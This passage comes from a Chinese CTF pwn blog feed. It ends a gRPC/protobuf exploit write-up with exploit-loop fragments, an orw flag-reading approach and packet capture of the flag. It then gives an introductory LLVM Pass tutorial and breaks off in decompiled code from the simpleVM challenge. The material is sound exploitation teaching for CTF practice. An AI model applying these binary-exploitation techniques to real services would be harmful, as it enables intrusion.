class="line">repeater(channel,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure><p>flag字符串是通过自带的字符串截取出来的</p><p>由于我们只是跟进程的一个端口23334打交道,所以就算getshell也没办法与其交互,因为shell继承的标准流是进程的</p><p>当然如果像binsh这些方法应该是可行的,不过显然有点麻烦</p><p>所以通过orw是一个比较好的选择</p><p>通过现成的 socket 传输 flag,但这样会导致结构错误从而使 python 没法处理数据，但是我们可以直接抓包获取 flag:</p><p><code>sudo tcpdump -i eth0 -w flag.pcap</code></p><p>除此以外还有另一种方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">23334</span>)</span><br><span class="line">conn = grpc.insecure_channel(<span class="string">&#x27;localhost:23334&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这两个虽然是不同的连接，但 p.recv 仍然可以接受 conn 的数据</p><hr><p>这类开放端口的服务器题目大多会有这个问题,可以用作参考</p>]]></content>
    
    
    <summary type="html">go</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="grpc" scheme="https://ixout.github.io/tags/grpc/"/>
    
    <category term="protobuf" scheme="https://ixout.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>llvm-pass初识</title>
    <link href="https://ixout.github.io/posts/10060/"/>
    <id>https://ixout.github.io/posts/10060/</id>
    <published>2024-04-12T04:36:45.000Z</published>
    <updated>2024-04-18T09:11:31.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h1><p>要学习LLVM PASS类pwn，首先要知道什么是LLVM</p><p><code>LLVM</code>是<code>C++</code>编写的构架编译器的框架系统，可用于优化以任意程序语言编写的程序。</p><p><code>LLVM Pass</code>可用于对代码进行优化或者对代码插桩（插入新代码），<code>LLVM</code>的核心库中提供了一些<code>Pass</code>类可以继承，通过实现它的一些方法，可以对传入的<code>LLVM IR</code>进行遍历并操作。</p><p><code>LLVM IR</code>即代码的中间表示，有三种形式：</p><ol><li><code>.ll</code> 格式：人类可以阅读的文本,介于高级语言和汇编代码之间</li><li><code>.bc</code> 格式：bitcode适合机器存储的二进制文件</li><li>内存表示,只保存在内存中</li></ol><p>然后要知道LLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-12_124718.png" alt=""></p><p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，这个叫IR的东西非常重要，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。</p><p>大概就是说，LLVM提供了<strong>一种中间语言形式</strong>，以及编译链接这种语言的后端能力，那么<u>对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力</u>。</p><p>而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装<code>CTF</code>题目中常用的三个版本的<code>clang</code>及<code>LLVM</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>一个测试用的c语言小程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, name, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译然后执行如下命令，将c文件编译成ll后缀的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure><p>查看内容</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; ModuleID = &#x27;test.c&#x27;</span></span><br><span class="line">source_filename <span class="operator">=</span> <span class="string">&quot;test.c&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">datalayout</span> <span class="operator">=</span> <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">triple</span> <span class="operator">=</span> <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title">@.str</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Please tell me your name:<span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"><span class="title">@.str.1</span> <span class="operator">=</span> <span class="keyword">private</span> <span class="keyword">unnamed_addr</span> <span class="keyword">constant</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>] <span class="keyword">c</span><span class="string">&quot;Hello: <span class="char escape_">\00</span>&quot;</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local <span class="type">i32</span> <span class="title">@main</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%1</span> <span class="operator">=</span> <span class="keyword">alloca</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">16</span></span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">26</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%4</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="variable">%5</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i32</span> (<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="title">@printf</span>(<span class="type">i8</span>* <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> ([<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">8</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="title">@.str.1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span>))</span><br><span class="line">  <span class="variable">%6</span> <span class="operator">=</span> <span class="keyword">getelementptr</span> <span class="keyword">inbounds</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]<span class="punctuation">,</span> [<span class="number">16</span> <span class="keyword">x</span> <span class="type">i8</span>]* <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">0</span></span><br><span class="line">  <span class="variable">%7</span> <span class="operator">=</span> <span class="keyword">call</span> <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> <span class="type">i8</span>* <span class="variable">%6</span><span class="punctuation">,</span> <span class="type">i64</span> <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">ret</span> <span class="type">i32</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@puts</span>(<span class="type">i8</span>*) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@read</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i32</span> <span class="title">@printf</span>(<span class="type">i8</span>*<span class="punctuation">,</span> ...) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> dso_local <span class="type">i64</span> <span class="title">@write</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i8</span>*<span class="punctuation">,</span> <span class="type">i64</span>) <span class="variable">#1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#0</span> <span class="operator">=</span> &#123; <span class="keyword">noinline</span> <span class="keyword">nounwind</span> <span class="keyword">optnone</span> <span class="keyword">uwtable</span> <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span><span class="operator">=</span><span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="keyword">attributes</span> <span class="variable">#1</span> <span class="operator">=</span> &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span><span class="operator">=</span><span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span><span class="operator">=</span><span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span><span class="operator">=</span><span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span><span class="operator">=</span><span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span><span class="operator">=</span><span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!llvm.module.flags</span> <span class="operator">=</span> !&#123;<span class="title">!0</span>&#125;</span><br><span class="line"><span class="title">!llvm.ident</span> <span class="operator">=</span> !&#123;<span class="title">!1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">!0</span> <span class="operator">=</span> !&#123;<span class="type">i32</span> <span class="number">1</span><span class="punctuation">,</span> !<span class="string">&quot;wchar_size&quot;</span><span class="punctuation">,</span> <span class="type">i32</span> <span class="number">4</span>&#125;</span><br><span class="line"><span class="title">!1</span> <span class="operator">=</span> !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>接下来我们用官方给的小demo写一个LLVM PASS出来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Constants.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/BasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="built_in">end</span>();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;OpcodeName = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getOpcodeName</span>() &lt;&lt; <span class="string">&quot; NumOperands = &quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getNumOperands</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (instIter-&gt;<span class="built_in">getOpcode</span>() == <span class="number">56</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="type">const</span> CallInst* call_inst = <span class="built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;</span><br><span class="line">                    <span class="built_in">errs</span>() &lt;&lt; call_inst-&gt;<span class="built_in">getCalledFunction</span>()-&gt;<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; instIter-&gt;<span class="built_in">getNumOperands</span>()<span class="number">-1</span>; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">isa</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getOperand</span>(i)))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Operand &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; <span class="built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="built_in">getArgOperand</span>(i))-&gt;<span class="built_in">getZExtValue</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>上述代码中的<code>Hello</code>结构体继承了<code>LLVM</code>核心库中的<code>FunctionPass</code>类，并重写了其中的<code>runOnFunction</code>函数（一般的<code>CTF</code>题都是如此）。<strong><code>runOnFunction</code>函数在<code>LLVM</code>遍历到每一个传入的<code>LLVM IR</code>中的函数时都会被调用。</strong></p><ol><li><p><code>getName()</code>函数用于获取当前<code>runOnFunction</code>正处理的函数名</p></li><li><p>第一个<code>for</code>循环是对当前处理的函数中的基本块（比如一些条件分支语句就会产生多个基本块，在生成的<code>ll</code>文件中，不同基本块之间会有换行）遍历，第二个<code>for</code>循环是对每个基本块中的指令遍历</p></li><li><p><code>getOpcodeName()</code>函数用于获取指令的操作符的名称，<code>getNumOperands()</code>用于获取指令的操作数的个数，<code>getOpcode()</code>函数用于获取指令的操作符编号，在<code>/usr/include/llvm-xx/llvm/IR/Instruction.def</code>文件中有对应表，可以看到，<code>56</code>号对应着<code>Call</code>这个操作符：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">HANDLE_OTHER_INST</span>(``<span class="number">56</span>``, Call  , CallInst  ) <span class="comment">// Call a function</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>当在一个<code>A</code>函数中调用了<code>B</code>函数，在<code>LLVM IR</code>中，<code>A</code>会通过<code>Call</code>操作符调用<code>B</code>，<code>getCalledFunction()</code>函数就是用于获取此处<code>B</code>函数块的指针</p></li><li><code>getOperand(i)</code>是用于获取第<code>i</code>个操作数（在这里就是获取所调用函数的第<code>i</code>个参数），<code>getArgOperand()</code>函数与其用法类似，但只能获取参数，<code>getZExtValue()</code>即<code>get Zero Extended Value</code>，也就是将获取的操作数转为无符号扩展整数</li><li>再看到最内层<code>for</code>循环中的<code>instIter-&gt;getNumOperands()-1</code>，这里需要<code>-1</code>是因为对于<code>call</code>和<code>invoke</code>操作符，操作数的数量是实际参数的个数<code>+1</code>（因为将被调用者也当成了操作数）</li><li><code>if (isa&lt;ConstantInt&gt;(call_inst-&gt;getOperand(i)))</code>这行语句是通过<code>isa</code>判断当前获取到的操作数是不是立即数（<code>ConstantInt</code>）</li><li><code>static RegisterPass&lt;Hello&gt; X(&quot;Hello&quot;, &quot;Hello World Pass&quot;);</code>中的第一个参数就是注册的<code>PASS</code>名称</li></ol><p>使用以下命令将其编译为一个so模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure><p>接着，通过<code>opt -load ./LLVMHello.so -Hello test.ll</code>命令运行，得到如下结果：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> aichch  ~/Program/clang  opt -load ./LLVMHello.so -Hello test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">OpcodeName = alloca NumOperands = 1</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line">puts</span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line"><span class="built_in">read</span></span><br><span class="line">Operand 0 = 0</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = call NumOperands = 2</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">OpcodeName = getelementptr NumOperands = 3</span><br><span class="line">OpcodeName = call NumOperands = 4</span><br><span class="line">write</span><br><span class="line">Operand 0 = 1</span><br><span class="line">Operand 2 = 16</span><br><span class="line">OpcodeName = ret NumOperands = 1</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2021redhat-simpleVM"><a href="#2021redhat-simpleVM" class="headerlink" title="2021redhat-simpleVM"></a>2021redhat-simpleVM</h2><p>题目提供了三个文件</p><p><code>opt-8</code>,<code>VMPass.so</code>以及<code>libc-2.31.so</code></p><p>核心肯定在于<code>VMPass.so</code>,首先定位到RunOnFunction函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span 